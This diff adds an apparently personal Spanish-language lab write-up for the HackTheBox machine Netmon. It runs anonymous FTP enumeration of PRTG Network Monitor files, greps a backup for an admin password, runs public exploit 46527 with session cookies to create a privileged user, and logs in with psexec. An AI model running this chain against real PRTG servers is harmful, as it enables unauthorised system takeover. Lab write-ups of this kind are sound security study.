@@ -1,0 +1,80 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Netmon HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/netmon/pasted-20251024231530.png" alt="Netmon HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Netmon</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>windows</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: FTP anónimo expone ficheros de PRTG Network Monitor</li>
+            <li><code>Explotación</code>: Credenciales de PRTG permiten acceso al panel web</li>
+            <li><code>Escalada de Privilegios</code>: Ejecución de notificaciones/scripts desde PRTG como usuario privilegiado</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/netmon/pasted-20251024232827.png" alt="Netmon HTB" />
+          <div class="code-card">
+            <h3>Acceder FTP y listar recursos de PRTG</h3>
+            <pre><code>ftp netmon
+
+cd C:\ProgramData\Paessler\PRTG Network Monitor
+get "PRTG Configuration.old.bak"
+
+# Grepeamos el archivo PRTG Configuration.old.bak por password y listamos una linea por debajo y por arriba con keysensitive
+grep -i -C 1 "password"  "PRTG Configuration.old.bak"
+
+# Vemos Credenciales -&gt;  prtgadmin:PrTg@dmin2019</code></pre>
+          </div>
+          <p><a href="https://www.paessler.com/manuals/prtg/data_storage">PRTG Server</a></p>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Explotar Web con credenciales</h3>
+            <pre><code># Buscamos exploits: PRTG Network Monitor 18.2.38 - (Authenticated) RCE
+searchsploit prtg
+searchsploit -m 46527
+
+# Ejecutamos el exploit: Necesita copiar los parámtros de las cookies sesión de la web
+./46527.sh -u netmon:80 -c 
+"_ga=GA1.1.755545916.1761341487; _gid=GA1.1.842595993.1761341487; OCTOPUS1813713946=e0I3Mjc2NTgwLUU1NzEtNDU2NC1CQTk5LUU3RTRDRDVEMjc2Rn0%3D"
+
+# Este script aprovecha una vulnerabilidad en las notificaciones del servidor y crea a nivel de sistema un usuario privilegiado "pentest" y contraseña "P3nT3st!" para conectarnos con psexec ya que SMB está activo
+psexec pentest@netmon</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>windows</span>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Notas</h2>
+          <p>[[PRTG Network Monitor]]</p>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
